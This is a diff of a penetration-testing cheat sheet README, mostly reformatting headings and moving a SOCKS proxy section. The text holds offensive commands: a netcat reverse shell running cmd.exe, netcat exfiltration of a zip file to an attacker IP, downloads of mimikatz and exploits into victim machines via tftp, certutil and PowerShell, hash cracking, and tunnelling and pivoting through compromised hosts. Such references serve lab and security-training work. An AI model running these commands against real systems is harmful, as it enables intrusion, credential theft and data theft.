@@ -15,10 +15,6 @@ Credit Info:
 I have obtained a lot of this info through other Github repos, blogs, sites and more.
 I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz
 
-## Active Directory & Domain Controllers
-----------------
-- WIP
-
 ## BOF (WIP)
 ----------------
 (Typical bad characters include: 0x00, 0x0A, 0x0D)
@@ -55,7 +51,7 @@ Good BOF resources:
 ## File Transfers
 ----------------
 
-#Wget Transfer
+wget Transfer
 
 How to retrieve file(s) from host (inside a reverse shell)
 
@@ -67,7 +63,7 @@ service apache2 start
 # wget -r http://10.10.10.10/pspy64/ <- for folder
 ```
 	
-#TFTP Transfer
+TFTP Transfer
 
 (How to transfer from Kali to Windows)
 
@@ -85,13 +81,13 @@ Inside a terminal
 
 4. `tftp -i 10.10.10.10 GET mimikatz.exe`
 
-#NC (Windows to Kali)
+NetCat (Windows to Kali)
 
 1. Windows: `nc -nv 10.11.0.61 4444 < bank-account.zip`
 
 2. Linux: `nc -nlvp 4444 > bank-account.zip`
 	
-#Powershell
+PowerShell
 
 ```ps
 Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
@@ -104,7 +100,7 @@ $client = New-Object System.Net.WebClient
 $path = "C:\path\to\save\file.txt"
 $client.DownloadFile($url, $path)
 ```
-#Base64 (Linux -> Linux)
+Base64 (Linux -> Linux)
 
 Local Host:
 1. `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
@@ -116,7 +112,7 @@ Remote Server - Linux:
 
 Remove Server - Powershell 
 	
-#Certutil
+Certutil
 
 ```
 certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
@@ -148,10 +144,10 @@ MSSQL / SQLi
 
 Password Cracking
 ----------------
-#Hashcat
+Hashcat
 - `hashcat -m 500 -a 0 -o cracked_password.txt --force hash.txt /path/to/your/wordlist.txt`
 
-#John The Ripper
+John The Ripper
 - `john --rules --wordlist=/path/to/your/wordlist.txt hash.txt`
 
 Password Spraying (CrackMapExec)
@@ -236,7 +232,7 @@ Use remote if you have a service that can be reached from the local machine, a
 Dynamic is like local, but on the client side it behaves like a SOCKS proxy. Use it if you need to connect with a software that expects SOCKS forwarding.
 ```
 
-#Chisel
+Chisel
 local system:
 ```
 ./chisel server -p 8080 --reverse
@@ -247,15 +243,25 @@ victim:
 ./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
 ```
 
-#Plink
--
+Plink
+- WIP
 
-#SSH
-- ssh root@10.10.10.10 -R 1234:127.0.0.1:1234
+SSH
+- ssh user@10.10.10.10 -R 1234:127.0.0.1:1234
+- ssh -D 1337 -q -C -N -f user@10.10.10.10 (https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters)
 
+Socks Proxy (using PowerShell)
+----------------
+Local
+- vi /etc/proxychains.conf
+- socks5 <ip> 9080
+- Import-Module .\Invoke-SocksProxy.psm1
+- Invoke-SocksProxy -bindPort 9080
+- proxychains nmap -sT <ip>
+	
 Port Scanning
 ----------------
-#TCP
+TCP
 - reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
 - nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
 - nmap -sT -p 22,80,110 -A 
@@ -263,20 +269,20 @@ Port Scanning
 - nc -v -n -z -w1 10.10.10.10 1-10000
 - nmap -p- -iL ips.txt > AllTCPPorts.txt
 
-#UDP (can take hours so maybe netstat is a better alternative)
+UDP (can take hours so maybe netstat is a better alternative)
 - nmap -sU --top-ports 10000
 - nmap -sT -sU -p 22,80,110 -A 
 - nmap -sT -sU -p- --min-rate 2000
 - nmap -p- -sU -iL ips.txt > udp.txt 
 - nmap -sU -sV -iL ips.txt > alludpports.txt 
 
-#SNMP
+SNMP
 nmap -p161 -sU -iL ips.txt > udp.txt  (cmd could be wrong, double check)
 
-#SSH
+SSH
 nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt 
 
-#SSL
+SSL
 nmap -v -v  --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt 
 
 NMAP Bootstrap Report
@@ -310,8 +316,6 @@ done
 # Nmap
 - nmap -sP 192.168.0.1-254
 
-
-
 Pivoting
 ----------------
 - sshuttle -r user@10.10.10.10 10.1.1.0/24
@@ -329,11 +333,11 @@ Responder
 
 Reverse Shells
 ----------------
-#Linux
+Linux
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - https://awansec.com/reverse-shell.html
 
-#Windows
+Windows
 - https://github.com/Dhayalanb/windows-php-reverse-shell
 - nc 10.10.10.10 4444 –e cmd.exe
 
@@ -341,15 +345,6 @@ Shell Upgrading
 ----------------
 
 Source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ & https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell
-
-Socks Proxy (using PowerShell)
-----------------
-#Local
-- vi /etc/proxychains.conf
-- socks5 <ip> 9080
-- Import-Module .\Invoke-SocksProxy.psm1
-- Invoke-SocksProxy -bindPort 9080
-- proxychains nmap -sT <ip>
 
 SQL Injection (SQLmap)
 ----------------
